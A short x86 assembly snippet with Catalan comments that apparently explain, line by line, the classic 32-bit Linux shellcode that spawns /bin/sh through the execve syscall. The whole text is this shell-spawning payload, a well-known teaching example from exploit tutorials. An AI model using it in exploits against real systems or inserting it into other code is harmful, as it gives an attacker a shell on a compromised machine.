xor     eax, eax    ;posa registre a 0 per netejar
push    eax         ;escriu a la pila
push    0x68732f2f  ;escriu //sh
push    0x6e69622f  ;escriu /bin
mov     ebx, esp    ;adresa de /bin//sh a ebx
push    eax         ;escriu NULL a la pila
mov     edx, esp    ;adresa de NULL a edx
push    ebx         ;escriu /bin//sh
mov     ecx, esp    ;adresa de adresa de /bin//sh a ecx
mov     al, 0xb     ;syscall execve id 11
int     0x80        ;invocar syscall
